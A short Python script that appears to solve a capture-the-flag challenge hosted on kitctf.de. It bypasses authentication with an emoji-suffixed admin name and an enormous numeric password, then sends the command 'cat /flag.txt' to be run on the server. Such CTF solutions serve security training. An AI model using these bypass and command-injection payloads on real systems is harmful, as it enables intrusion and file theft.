import requests, json, hashlib

base_URL = 'https://durch-den-monsun--tokio-hotel-8626.ctf.kitctf.de/'

headers = {
    'User-Agent': 'friendlyHuman',
    'Content-Type': 'application/x-www-form-urlencoded'
}

payload = {
    'user': 'admin🤠',
    'password': 9*10**1000, 
    'command': 'cat /flag.txt'
}

data = {
    'data': json.dumps(payload)
}

res = requests.post(base_URL, headers=headers, data=data)

print(res.text)